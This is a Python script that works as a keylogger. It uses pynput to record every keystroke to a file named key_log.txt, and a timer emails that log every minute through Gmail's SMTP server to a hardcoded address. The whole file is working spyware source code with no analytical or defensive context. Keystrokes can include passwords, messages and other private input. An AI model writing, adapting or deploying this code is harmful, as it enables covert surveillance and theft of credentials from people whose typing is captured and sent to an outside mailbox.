import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
from pynput.keyboard import Key, Listener
import threading
import logging






log_dir = ""
def email_send():
	subject = 'Logs'


	msg = MIMEMultipart()
	msg['From'] = 'michaelray54213@gmail.com'
	msg['To'] = 'michaelray54213@gmail.com'
	msg['subject'] = subject

	body = 'Sending this from python'
	msg.attach(MIMEText(body,'plain'))

	filename='key_log.txt'
	attachment = open(filename, 'rb')

	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= "+filename)

	msg.attach(part)



	text = msg.as_string()

	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login('michaelray54213@gmail.com', '*********')


	server.sendmail('michaelray54213@gmail.com', 'michaelray54213@gmail.com', text)
	server.quit()


def wuf ():
    global timer

    email_send()
    time.sleep(1)
    timer = threading.Timer(60, wuf)
    timer.start()

timer = threading.Timer(60, wuf)
timer.start()

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(Key): 
	logging.info(str(Key))

with Listener(on_press=on_press) as listener:
	listener.join()
	








